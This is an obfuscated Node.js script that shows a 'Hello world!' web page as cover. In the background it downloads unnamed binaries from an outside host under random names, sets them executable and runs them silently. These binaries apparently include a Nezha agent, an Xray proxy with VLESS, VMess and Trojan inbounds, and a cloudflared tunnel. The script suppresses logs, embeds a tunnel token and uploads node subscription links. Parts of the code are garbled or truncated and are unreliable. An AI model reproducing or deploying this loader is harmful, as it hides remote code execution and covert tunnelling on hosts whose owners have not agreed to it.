const express=require("\x65\x78\x70\x72\x65\x73\x73");const app=express();const axios=require("\x61\x78\x69\x6f\x73");const os=require('\x6f\x73');const fs=require("\x66\x73");const path=require("\x70\x61\x74\x68");const{promisify}=require('\x75\x74\x69\x6c');const exec=promisify(require('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73')['\x65\x78\x65\x63']);const{execSync}=require('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');const UPLOAD_URL=process['\x65\x6e\x76']['\x55\x50\x4c\x4f\x41\x44\x5f\x55\x52\x4c']||'';const PROJECT_URL=process['\x65\x6e\x76']['\x50\x52\x4f\x4a\x45\x43\x54\x5f\x55\x52\x4c']||'';const AUTO_ACCESS=process['\x65\x6e\x76']['\x41\x55\x54\x4f\x5f\x41\x43\x43\x45\x53\x53']||false;const FILE_PATH=process['\x65\x6e\x76']['\x46\x49\x4c\x45\x5f\x50\x41\x54\x48']||'\x2e\x2f\x74\x6d\x70';const SUB_PATH=process['\x65\x6e\x76']['\x53\x55\x42\x5f\x50\x41\x54\x48']||'\x73\x75\x62';const PORT=process['\x65\x6e\x76']['\x53\x45\x52\x56\x45\x52\x5f\x50\x4f\x52\x54']||process['\x65\x6e\x76']['\x50\x4f\x52\x54']||3000;const UUID=process['\x65\x6e\x76']['\x55\x55\x49\x44']||'\x62\x62\x36\x39\x33\x36\x39\x66\x2d\x65\x33\x36\x35\x2d\x34\x61\x37\x64\x2d\x39\x30\x63\x37\x2d\x65\x63\x36\x35\x31\x31\x38\x31\x31\x62\x64\x64';const NEZHA_SERVER=process['\x65\x6e\x76']['\x4e\x45\x5a\x48\x41\x5f\x53\x45\x52\x56\x45\x52']||'';const NEZHA_PORT=process['\x65\x6e\x76']['\x4e\x45\x5a\x48\x41\x5f\x50\x4f\x52\x54']||'';const NEZHA_KEY=process['\x65\x6e\x76']['\x4e\x45\x5a\x48\x41\x5f\x4b\x45\x59']||'';const ARGO_DOMAIN=process['\x65\x6e\x76']['\x41\x52\x47\x4f\x5f\x44\x4f\x4d\x41\x49\x4e']||'\x61\x64\x73\x31\x31\x31\x35\x2e\x6b\x69\x6e\x67\x39\x37\x37\x37\x2e\x64\x70\x64\x6e\x73\x2e\x6f\x72\x67';const ARGO_AUTH=process['\x65\x6e\x76']['\x41\x52\x47\x4f\x5f\x41\x55\x54\x48']||'\x65\x79\x4a\x68\x49\x6a\x6f\x69\x4f\x54\x68\x69\x4d\x44\x5a\x69\x4d\x6d\x59\x31\x4e\x47\x51\x32\x59\x6a\x6b\x35\x4e\x7a\x6c\x6c\x4e\x6a\x59\x31\x4f\x47\x59\x78\x4d\x57\x45\x35\x4e\x57\x59\x77\x4d\x6d\x55\x69\x4c\x43\x4a\x30\x49\x6a\x6f\x69\x5a\x57\x5a\x69\x4e\x6a\x4e\x6a\x5a\x6d\x4d\x74\x5a\x6a\x64\x68\x4f\x43\x30\x30\x4e\x47\x51\x31\x4c\x57\x49\x33\x59\x7a\x59\x74\x5a\x6a\x6b\x77\x59\x6a\x67\x31\x59\x6d\x4d\x32\x59\x57\x55\x79\x49\x69\x77\x69\x63\x79\x49\x36\x49\x6b\x31\x58\x56\x6d\x68\x61\x52\x45\x46\x36\x54\x6c\x52\x42\x64\x45\x35\x55\x61\x33\x68\x5a\x61\x54\x41\x77\x54\x57\x31\x4a\x65\x55\x78\x55\x61\x7a\x4e\x4e\x62\x56\x56\x30\x54\x6d\x70\x72\x4d\x30\x35\x45\x53\x6d\x31\x4f\x56\x45\x6c\x33\x57\x57\x70\x4e\x4d\x79\x4a\x39';const ARGO_PORT=process['\x65\x6e\x76']['\x41\x52\x47\x4f\x5f\x50\x4f\x52\x54']||8001;const CFIP=process['\x65\x6e\x76']['\x43\x46\x49\x50']||'\x63\x64\x6e\x73\x2e\x64\x6f\x6f\x6e\x2e\x65\x75\x2e\x6f\x72\x67';const CFPORT=process['\x65\x6e\x76']['\x43\x46\x50\x4f\x52\x54']||443;const NAME=process['\x65\x6e\x76']['\x4e\x41\x4d\x45']||'\x6b\x69\x6e\x67\x39\x37\x37\x37';if(!fs['\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63'](FILE_PATH)){fs['\x6d\x6b\x64\x69\x72\x53\x79\x6e\x63'](FILE_PATH);console['\x6c\x6f\x67'](`${FILE_PATH}is created`)}else{console['\x6c\x6f\x67'](`${FILE_PATH}already exists`)}function generateRandomName(){const characters='\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a';let result='';for(let i=0;i<6;i++){result+=characters['\x63\x68\x61\x72\x41\x74'](window["\x4d\x61\x74\x68"]['\x66\x6c\x6f\x6f\x72'](window["\x4d\x61\x74\x68"]['\x72\x61\x6e\x64\x6f\x6d']()*characters['\x6c\x65\x6e\x67\x74\x68']))}return result}const npmName=generateRandomName();const webName=generateRandomName();const botName=generateRandomName();const phpName=generateRandomName();let npmPath=path['\x6a\x6f\x69\x6e'](FILE_PATH,npmName);let phpPath=path['\x6a\x6f\x69\x6e'](FILE_PATH,phpName);let webPath=path['\x6a\x6f\x69\x6e'](FILE_PATH,webName);let botPath=path['\x6a\x6f\x69\x6e'](FILE_PATH,botName);let subPath=path['\x6a\x6f\x69\x6e'](FILE_PATH,'\x73\x75\x62\x2e\x74\x78\x74');let listPath=path['\x6a\x6f\x69\x6e'](FILE_PATH,'\x6c\x69\x73\x74\x2e\x74\x78\x74');let bootLogPath=path['\x6a\x6f\x69\x6e'](FILE_PATH,'\x62\x6f\x6f\x74\x2e\x6c\x6f\x67');let configPath=path['\x6a\x6f\x69\x6e'](FILE_PATH,'\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73\x6f\x6e');function deleteNodes(){try{if(!UPLOAD_URL)return;if(!fs['\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63'](subPath))return;let fileContent;try{fileContent=fs['\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79\x6e\x63'](subPath,'\x75\x74\x66\x2d\x38')}catch{return null}const decoded=Buffer['\x66\x72\x6f\x6d'](fileContent,'\x62\x61\x73\x65\x36\x34')['\x74\x6f\x53\x74\x72\x69\x6e\x67']('\x75\x74\x66\x2d\x38');const nodes=decoded['\x73\x70\x6c\x69\x74']('\n')['\x66\x69\x6c\x74\x65\x72'](line=>/(vless|vmess|trojan|hysteria2|tuic):\/\);if(nodes['\x6c\x65\x6e\x67\x74\x68']===0)return;axios['\x70\x6f\x73\x74'](`${UPLOAD_URL}/api/delete-nodes`,JSON['\x73\x74\x72\x69\x6e\x67\x69\x66\x79']({nodes}),{headers:{'\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65':'\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e'}})['\x63\x61\x74\x63\x68']((error)=>{return null});return null}catch(err){return null}}function cleanupOldFiles(){try{const files=fs['\x72\x65\x61\x64\x64\x69\x72\x53\x79\x6e\x63'](FILE_PATH);files['\x66\x6f\x72\x45\x61\x63\x68'](file=>{const filePath=path['\x6a\x6f\x69\x6e'](FILE_PATH,file);try{const stat=fs['\x73\x74\x61\x74\x53\x79\x6e\x63'](filePath);if(stat['\x69\x73\x46\x69\x6c\x65']()){fs['\x75\x6e\x6c\x69\x6e\x6b\x53\x79\x6e\x63'](filePath)}}catch(err){}})}catch(err){}}app['\x67\x65\x74']("\x2f",function(w1,ieDZ2){ieDZ2['\x73\x65\x6e\x64']("\x48\x65\x6c\x6c\x6f \x77\x6f\x72\x6c\x64\x21")});async function generateConfig(){const config={log:{access:'\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c',error:'\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c',loglevel:'\x6e\x6f\x6e\x65'},inbounds:[{port:ARGO_PORT,protocol:'\x76\x6c\x65\x73\x73',settings:{clients:[{id:UUID,flow:'\x78\x74\x6c\x73\x2d\x72\x70\x72\x78\x2d\x76\x69\x73\x69\x6f\x6e'}],decryption:'\x6e\x6f\x6e\x65',fallbacks:[{dest:3001},{path:"\x2f\x76\x6c\x65\x73\x73\x2d\x61\x72\x67\x6f",dest:3002},{path:"\x2f\x76\x6d\x65\x73\x73\x2d\x61\x72\x67\x6f",dest:3003},{path:"\x2f\x74\x72\x6f\x6a\x61\x6e\x2d\x61\x72\x67\x6f",dest:3004}]},streamSettings:{network:'\x74\x63\x70'}},{port:3001,listen:"\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31",protocol:"\x76\x6c\x65\x73\x73",settings:{clients:[{id:UUID}],decryption:"\x6e\x6f\x6e\x65"},streamSettings:{network:"\x74\x63\x70",security:"\x6e\x6f\x6e\x65"}},{port:3002,listen:"\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31",protocol:"\x76\x6c\x65\x73\x73",settings:{clients:[{id:UUID,level:0}],decryption:"\x6e\x6f\x6e\x65"},streamSettings:{network:"\x77\x73",security:"\x6e\x6f\x6e\x65",wsSettings:{path:"\x2f\x76\x6c\x65\x73\x73\x2d\x61\x72\x67\x6f"}},sniffing:{enabled:true,destOverride:["\x68\x74\x74\x70","\x74\x6c\x73","\x71\x75\x69\x63"],metadataOnly:false}},{port:3003,listen:"\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31",protocol:"\x76\x6d\x65\x73\x73",settings:{clients:[{id:UUID,alterId:0}]},streamSettings:{network:"\x77\x73",wsSettings:{path:"\x2f\x76\x6d\x65\x73\x73\x2d\x61\x72\x67\x6f"}},sniffing:{enabled:true,destOverride:["\x68\x74\x74\x70","\x74\x6c\x73","\x71\x75\x69\x63"],metadataOnly:false}},{port:3004,listen:"\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31",protocol:"\x74\x72\x6f\x6a\x61\x6e",settings:{clients:[{password:UUID}]},streamSettings:{network:"\x77\x73",security:"\x6e\x6f\x6e\x65",wsSettings:{path:"\x2f\x74\x72\x6f\x6a\x61\x6e\x2d\x61\x72\x67\x6f"}},sniffing:{enabled:true,destOverride:["\x68\x74\x74\x70","\x74\x6c\x73","\x71\x75\x69\x63"],metadataOnly:false}},],dns:{servers:["\x68\x74\x74\x70\x73\x2b\x6c\x6f\x63\x61\x6c\x3a\x2f\x2f\x38\x2e\x38\x2e\x38\x2e\x38\x2f\x64\x6e\x73\x2d\x71\x75\x65\x72\x79"]},outbounds:[{protocol:"\x66\x72\x65\x65\x64\x6f\x6d",tag:"\x64\x69\x72\x65\x63\x74"},{protocol:"\x62\x6c\x61\x63\x6b\x68\x6f\x6c\x65",tag:"\x62\x6c\x6f\x63\x6b"}]};fs['\x77\x72\x69\x74\x65\x46\x69\x6c\x65\x53\x79\x6e\x63'](path['\x6a\x6f\x69\x6e'](FILE_PATH,'\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73\x6f\x6e'),JSON['\x73\x74\x72\x69\x6e\x67\x69\x66\x79'](config,null,2))}function getSystemArchitecture(){const arch=os['\x61\x72\x63\x68']();if(arch==='\x61\x72\x6d'||arch==='\x61\x72\x6d\x36\x34'||arch==='\x61\x61\x72\x63\x68\x36\x34'){return'\x61\x72\x6d'}else{return'\x61\x6d\x64'}}function downloadFile(fileName,YOYEk3,V4){const filePath=fileName;if(!fs['\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63'](FILE_PATH)){fs['\x6d\x6b\x64\x69\x72\x53\x79\x6e\x63'](FILE_PATH,{recursive:true})}const writer=fs['\x63\x72\x65\x61\x74\x65\x57\x72\x69\x74\x65\x53\x74\x72\x65\x61\x6d'](filePath);axios({method:'\x67\x65\x74',url:YOYEk3,responseType:'\x73\x74\x72\x65\x61\x6d',})['\x74\x68\x65\x6e'](response=>{response['\x64\x61\x74\x61']['\x70\x69\x70\x65'](writer);writer['\x6f\x6e']('\x66\x69\x6e\x69\x73\x68',()=>{writer['\x63\x6c\x6f\x73\x65']();console['\x6c\x6f\x67'](`Download ${path['\x62\x61\x73\x65\x6e\x61\x6d\x65'](filePath)}successfully`);V4(null,filePath)});writer['\x6f\x6e']('\x65\x72\x72\x6f\x72',err=>{fs['\x75\x6e\x6c\x69\x6e\x6b'](filePath,()=>{});const errorMessage=`Download ${path['\x62\x61\x73\x65\x6e\x61\x6d\x65'](filePath)}failed:${err['\x6d\x65\x73\x73\x61\x67\x65']}`;console['\x65\x72\x72\x6f\x72'](errorMessage);V4(errorMessage)})})['\x63\x61\x74\x63\x68'](err=>{const errorMessage=`Download ${path['\x62\x61\x73\x65\x6e\x61\x6d\x65'](filePath)}failed:${err['\x6d\x65\x73\x73\x61\x67\x65']}`;console['\x65\x72\x72\x6f\x72'](errorMessage);V4(errorMessage)})}async function downloadFilesAndRun(){const architecture=getSystemArchitecture();const filesToDownload=getFilesForArchitecture(architecture);if(filesToDownload['\x6c\x65\x6e\x67\x74\x68']===0){console['\x6c\x6f\x67'](`Can'\x74 \x66\x69\x6e\x64 \x61 \x66\x69\x6c\x65 \x66\x6f\x72 \x74\x68\x65 \x63\x75\x72\x72\x65\x6e\x74 \x61\x72\x63\x68\x69\x74\x65\x63\x74\x75\x72\x65\x60\x29\x3b    \x72\x65\x74\x75\x72\x6e\x3b  \x7d  \x63\x6f\x6e\x73\x74 \x64\x6f\x77\x6e\x6c\x6f\x61\x64\x50\x72\x6f\x6d\x69\x73\x65\x73 \x3d \x66\x69\x6c\x65\x73\x54\x6f\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x2e\x6d\x61\x70\x28\x66\x69\x6c\x65\x49\x6e\x66\x6f \x3d\x3e \x7b    \x72\x65\x74\x75\x72\x6e \x6e\x65\x77 \x50\x72\x6f\x6d\x69\x73\x65\x28\x28\x72\x65\x73\x6f\x6c\x76\x65\x2c \x72\x65\x6a\x65\x63\x74\x29 \x3d\x3e \x7b      \x64\x6f\x77\x6e\x6c\x6f\x61\x64\x46\x69\x6c\x65\x28\x66\x69\x6c\x65\x49\x6e\x66\x6f\x2e\x66\x69\x6c\x65\x4e\x61\x6d\x65\x2c \x66\x69\x6c\x65\x49\x6e\x66\x6f\x2e\x66\x69\x6c\x65\x55\x72\x6c\x2c \x28\x65\x72\x72\x2c \x66\x69\x6c\x65\x50\x61\x74\x68\x29 \x3d\x3e \x7b        \x69\x66 \x28\x65\x72\x72\x29 \x7b          \x72\x65\x6a\x65\x63\x74\x28\x65\x72\x72\x29\x3b        \x7d \x65\x6c\x73\x65 \x7b          \x72\x65\x73\x6f\x6c\x76\x65\x28\x66\x69\x6c\x65\x50\x61\x74\x68\x29\x3b        \x7d      \x7d\x29\x3b    \x7d\x29\x3b  \x7d\x29\x3b  \x74\x72\x79 \x7b    \x61\x77\x61\x69\x74 \x50\x72\x6f\x6d\x69\x73\x65\x2e\x61\x6c\x6c\x28\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x50\x72\x6f\x6d\x69\x73\x65\x73\x29\x3b  \x7d \x63\x61\x74\x63\x68 \x28\x65\x72\x72\x29 \x7b    \x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x65\x72\x72\x6f\x72\x28'window["\x45\x72\x72\x6f\x72"] downloading files:'\x2c \x65\x72\x72\x29\x3b    \x72\x65\x74\x75\x72\x6e\x3b  \x7d  \x2f\x2f \u6388\u6743\u548c\u8fd0\u884c  \x66\x75\x6e\x63\x74\x69\x6f\x6e \x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x46\x69\x6c\x65\x73\x28\x66\x69\x6c\x65\x50\x61\x74\x68\x73\x29 \x7b    \x63\x6f\x6e\x73\x74 \x6e\x65\x77\x50\x65\x72\x6d\x69\x73\x73\x69\x6f\x6e\x73 \x3d \x30\x6f\x37\x37\x35\x3b    \x66\x69\x6c\x65\x50\x61\x74\x68\x73\x2e\x66\x6f\x72\x45\x61\x63\x68\x28\x61\x62\x73\x6f\x6c\x75\x74\x65\x46\x69\x6c\x65\x50\x61\x74\x68 \x3d\x3e \x7b      \x69\x66 \x28\x66\x73\x2e\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63\x28\x61\x62\x73\x6f\x6c\x75\x74\x65\x46\x69\x6c\x65\x50\x61\x74\x68\x29\x29 \x7b        \x66\x73\x2e\x63\x68\x6d\x6f\x64\x28\x61\x62\x73\x6f\x6c\x75\x74\x65\x46\x69\x6c\x65\x50\x61\x74\x68\x2c \x6e\x65\x77\x50\x65\x72\x6d\x69\x73\x73\x69\x6f\x6e\x73\x2c \x28\x65\x72\x72\x29 \x3d\x3e \x7b          \x69\x66 \x28\x65\x72\x72\x29 \x7b            \x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x65\x72\x72\x6f\x72\x28\x60\x45\x6d\x70\x6f\x77\x65\x72\x6d\x65\x6e\x74 \x66\x61\x69\x6c\x65\x64 \x66\x6f\x72 \x24\x7b\x61\x62\x73\x6f\x6c\x75\x74\x65\x46\x69\x6c\x65\x50\x61\x74\x68\x7d\x3a \x24\x7b\x65\x72\x72\x7d\x60\x29\x3b          \x7d \x65\x6c\x73\x65 \x7b            \x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x60\x45\x6d\x70\x6f\x77\x65\x72\x6d\x65\x6e\x74 \x73\x75\x63\x63\x65\x73\x73 \x66\x6f\x72 \x24\x7b\x61\x62\x73\x6f\x6c\x75\x74\x65\x46\x69\x6c\x65\x50\x61\x74\x68\x7d\x3a \x24\x7b\x6e\x65\x77\x50\x65\x72\x6d\x69\x73\x73\x69\x6f\x6e\x73\x2e\x74\x6f\x53\x74\x72\x69\x6e\x67\x28\x38\x29\x7d\x60\x29\x3b          \x7d        \x7d\x29\x3b      \x7d    \x7d\x29\x3b  \x7d  \x63\x6f\x6e\x73\x74 \x66\x69\x6c\x65\x73\x54\x6f\x41\x75\x74\x68\x6f\x72\x69\x7a\x65 \x3d \x4e\x45\x5a\x48\x41\x5f\x50\x4f\x52\x54 \x3f \x5b\x6e\x70\x6d\x50\x61\x74\x68\x2c \x77\x65\x62\x50\x61\x74\x68\x2c \x62\x6f\x74\x50\x61\x74\x68\x5d \x3a \x5b\x70\x68\x70\x50\x61\x74\x68\x2c \x77\x65\x62\x50\x61\x74\x68\x2c \x62\x6f\x74\x50\x61\x74\x68\x5d\x3b  \x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x46\x69\x6c\x65\x73\x28\x66\x69\x6c\x65\x73\x54\x6f\x41\x75\x74\x68\x6f\x72\x69\x7a\x65\x29\x3b  \x2f\x2f\u8fd0\u884c\x6e\x65\x2d\x7a\x68\x61  \x69\x66 \x28\x4e\x45\x5a\x48\x41\x5f\x53\x45\x52\x56\x45\x52 \x26\x26 \x4e\x45\x5a\x48\x41\x5f\x4b\x45\x59\x29 \x7b    \x69\x66 \x28\x21\x4e\x45\x5a\x48\x41\x5f\x50\x4f\x52\x54\x29 \x7b      \x2f\x2f \u68c0\u6d4b\u54ea\u5412\u662f\u5426\u5f00\u542f\x54\x4c\x53      \x63\x6f\x6e\x73\x74 \x70\x6f\x72\x74 \x3d \x4e\x45\x5a\x48\x41\x5f\x53\x45\x52\x56\x45\x52\x2e\x69\x6e\x63\x6c\x75\x64\x65\x73\x28':'\x29 \x3f \x4e\x45\x5a\x48\x41\x5f\x53\x45\x52\x56\x45\x52\x2e\x73\x70\x6c\x69\x74\x28':'\x29\x2e\x70\x6f\x70\x28\x29 \x3a ''\x3b      \x63\x6f\x6e\x73\x74 \x74\x6c\x73\x50\x6f\x72\x74\x73 \x3d \x6e\x65\x77 \x53\x65\x74\x28\x5b'443'\x2c '8443'\x2c '2096'\x2c '2087'\x2c '2083'\x2c '2053'\x5d\x29\x3b      \x63\x6f\x6e\x73\x74 \x6e\x65\x7a\x68\x61\x74\x6c\x73 \x3d \x74\x6c\x73\x50\x6f\x72\x74\x73\x2e\x68\x61\x73\x28\x70\x6f\x72\x74\x29 \x3f 'true' \x3a 'false'\x3b      \x2f\x2f \u751f\u6210 \x63\x6f\x6e\x66\x69\x67\x2e\x79\x61\x6d\x6c      \x63\x6f\x6e\x73\x74 \x63\x6f\x6e\x66\x69\x67\x59\x61\x6d\x6c \x3d \x60\x63\x6c\x69\x65\x6e\x74\x5f\x73\x65\x63\x72\x65\x74\x3a \x24\x7b\x4e\x45\x5a\x48\x41\x5f\x4b\x45\x59\x7d\x64\x65\x62\x75\x67\x3a \x66\x61\x6c\x73\x65\x64\x69\x73\x61\x62\x6c\x65\x5f\x61\x75\x74\x6f\x5f\x75\x70\x64\x61\x74\x65\x3a \x74\x72\x75\x65\x64\x69\x73\x61\x62\x6c\x65\x5f\x63\x6f\x6d\x6d\x61\x6e\x64\x5f\x65\x78\x65\x63\x75\x74\x65\x3a \x66\x61\x6c\x73\x65\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x6f\x72\x63\x65\x5f\x75\x70\x64\x61\x74\x65\x3a \x74\x72\x75\x65\x64\x69\x73\x61\x62\x6c\x65\x5f\x6e\x61\x74\x3a \x66\x61\x6c\x73\x65\x64\x69\x73\x61\x62\x6c\x65\x5f\x73\x65\x6e\x64\x5f\x71\x75\x65\x72\x79\x3a \x66\x61\x6c\x73\x65\x67\x70\x75\x3a \x66\x61\x6c\x73\x65\x69\x6e\x73\x65\x63\x75\x72\x65\x5f\x74\x6c\x73\x3a \x74\x72\x75\x65\x69\x70\x5f\x72\x65\x70\x6f\x72\x74\x5f\x70\x65\x72\x69\x6f\x64\x3a \x31\x38\x30\x30\x72\x65\x70\x6f\x72\x74\x5f\x64\x65\x6c\x61\x79\x3a \x34\x73\x65\x72\x76\x65\x72\x3a \x24\x7b\x4e\x45\x5a\x48\x41\x5f\x53\x45\x52\x56\x45\x52\x7d\x73\x6b\x69\x70\x5f\x63\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x5f\x63\x6f\x75\x6e\x74\x3a \x74\x72\x75\x65\x73\x6b\x69\x70\x5f\x70\x72\x6f\x63\x73\x5f\x63\x6f\x75\x6e\x74\x3a \x74\x72\x75\x65\x74\x65\x6d\x70\x65\x72\x61\x74\x75\x72\x65\x3a \x66\x61\x6c\x73\x65\x74\x6c\x73\x3a \x24\x7b\x6e\x65\x7a\x68\x61\x74\x6c\x73\x7d\x75\x73\x65\x5f\x67\x69\x74\x65\x65\x5f\x74\x6f\x5f\x75\x70\x67\x72\x61\x64\x65\x3a \x66\x61\x6c\x73\x65\x75\x73\x65\x5f\x69\x70\x76\x36\x5f\x63\x6f\x75\x6e\x74\x72\x79\x5f\x63\x6f\x64\x65\x3a \x66\x61\x6c\x73\x65\x75\x75\x69\x64\x3a \x24\x7b\x55\x55\x49\x44\x7d\x60\x3b            \x66\x73\x2e\x77\x72\x69\x74\x65\x46\x69\x6c\x65\x53\x79\x6e\x63\x28\x70\x61\x74\x68\x2e\x6a\x6f\x69\x6e\x28\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x2c 'config['\x79\x61\x6d\x6c']'), configYaml);            // 运行 v1      const command = `nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;      try {        await exec(command);        console.log(`${phpName} is running`);        await new Promise((resolve) => setTimeout(resolve, 1000));      } catch (error) {        console.error(`php running error: ${error}`);      }    } else {      let NEZHA_TLS = '';      const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];      if (tlsPorts.includes(NEZHA_PORT)) {        NEZHA_TLS = '--tls';      }      const command = `nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;      try {        await exec(command);        console.log(`${npmName} is running`);        await new Promise((resolve) => setTimeout(resolve, 1000));      } catch (error) {        console.error(`npm running error: ${error}`);      }    }  } else {    console.log('NEZHA variable is empty,skip running');  }  //运行xr-ay  const command1 = `nohup ${webPath} -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;  try {    await exec(command1);    console.log(`${webName} is running`);    await new Promise((resolve) => setTimeout(resolve, 1000));  } catch (error) {    console.error(`web running error: ${error}`);  }  // 运行cloud-fared  if (fs.existsSync(botPath)) {    let args;    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;    } else if (ARGO_AUTH.match(/TunnelSecret/)) {      args = `tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;    } else {      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;    }    try {      await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);      console.log(`${botName} is running`);      await new Promise((resolve) => setTimeout(resolve, 2000));    } catch (error) {      console.error(`Error executing command: ${error}`);    }  }  await new Promise((resolve) => setTimeout(resolve, 5000));}//根据系统架构返回对应的urlfunction getFilesForArchitecture(architecture) {  let baseFiles;  if (architecture === 'arm') {    baseFiles = [      { fileName: webPath, fileUrl: "https://arm64.ssss.nyc.mn/web" },      { fileName: botPath, fileUrl: "https://arm64.ssss.nyc.mn/bot" }    ];  } else {    baseFiles = [      { fileName: webPath, fileUrl: "https://amd64.ssss.nyc.mn/web" },      { fileName: botPath, fileUrl: "https://amd64.ssss.nyc.mn/bot" }    ];  }  if (NEZHA_SERVER && NEZHA_KEY) {    if (NEZHA_PORT) {      const npmUrl = architecture === 'arm'         ? "https://arm64.ssss.nyc.mn/agent"        : "https://amd64.ssss.nyc.mn/agent";        baseFiles.unshift({           fileName: npmPath,           fileUrl: npmUrl         });    } else {      const phpUrl = architecture === 'arm'         ? "https://arm64.ssss.nyc.mn/v1"         : "https://amd64.ssss.nyc.mn/v1";      baseFiles.unshift({         fileName: phpPath,         fileUrl: phpUrl      });    }  }  return baseFiles;}// 获取固定隧道jsonfunction argoType() {  if (!ARGO_AUTH || !ARGO_DOMAIN) {    console.log("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels");    return;  }  if (ARGO_AUTH.includes('TunnelSecret')) {    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), ARGO_AUTH);    const tunnelYaml = `  tunnel: ${ARGO_AUTH.split('"')[11]}  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}  protocol: http2    ingress:    - hostname: ${ARGO_DOMAIN}      service: http://localhost:${ARGO_PORT}      originRequest:        noTLSVerify: true    - service: http_status:404  `;    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);  } else {    console.log("ARGO_AUTH mismatch TunnelSecret,use token connect to tunnel");  }}argoType();// 获取临时隧道domainasync function extractDomains() {  let argoDomain;  if (ARGO_AUTH && ARGO_DOMAIN) {    argoDomain = ARGO_DOMAIN;    console.log('ARGO_DOMAIN:', argoDomain);    await generateLinks(argoDomain);  } else {    try {      const fileContent = fs.readFileSync(path.join(FILE_PATH, 'boot.log'), 'utf-8');      const lines = fileContent.split('\n');      const argoDomains = [];      lines.forEach((line) => {        const domainMatch = line.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);        if (domainMatch) {          const domain = domainMatch[1];          argoDomains.push(domain);        }      });      if (argoDomains.length > 0) {        argoDomain = argoDomains[0];        console.log('ArgoDomain:', argoDomain);        await generateLinks(argoDomain);      } else {        console.log('ArgoDomain not found, re-running bot to obtain ArgoDomain');        // 删除 boot.log 文件，等待 2s 重新运行 server 以获取 ArgoDomain        fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));        async function killBotProcess() {          try {            // Windows系统使用taskkill命令            if (process.platform === 'win32') {              await exec(`taskkill /f /im ${botName}.exe > nul 2>&1`);            } else {              await exec(`pkill -f "[${botName.charAt(0)}]${botName.substring(1)}" > /dev/null 2>&1`);            }          } catch (error) {            // 忽略输出          }        }        killBotProcess();        await new Promise((resolve) => setTimeout(resolve, 3000));        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;        try {          await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);          console.log(`${botName} is running`);          await new Promise((resolve) => setTimeout(resolve, 3000));          await extractDomains(); // 重新提取域名        } catch (error) {          console.error(`Error executing command: ${error}`);        }      }    } catch (error) {      console.error('Error reading boot.log:', error);    }  }  // 生成 list 和 sub 信息  async function generateLinks(argoDomain) {    const metaInfo = execSync(      'curl -sm 5 https://speed.cloudflare.com/meta | awk -F\\"\'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',{encoding:'utf-8'});const ISP=metaInfo.trim();const nodeName=NAME?`${NAME}-${ISP}`:ISP;return new Promise((resolve)=>{setTimeout(()=>{const VMESS={v:'2',ps:`${nodeName}`,add:CFIP,port:CFPORT,id:UUID,aid:'0',scy:'none',net:'ws',type:'none',host:argoDomain,path:'/vmess-argo?ed=2560',tls:'tls',sni:argoDomain,alpn:'',fp:'firefox'};const subTxt=`vless:vmess:trojan:`;console.log(Buffer.from(subTxt).toString('base64'));fs.writeFileSync(subPath,Buffer.from(subTxt).toString('base64'));console.log(`${FILE_PATH}/sub.txt saved successfully`);uploadNodes();app.get(`/${SUB_PATH}`,(req,res)=>{const encodedContent=Buffer.from(subTxt).toString('base64');res.set('Content-Type','text/plain; charset=utf-8');res.send(encodedContent)});resolve(subTxt)},2000)})}}async function uploadNodes(){if(UPLOAD_URL&&PROJECT_URL){const subscriptionUrl=`${PROJECT_URL}/${SUB_PATH}`;const jsonData={subscription:[subscriptionUrl]};try{const response=await 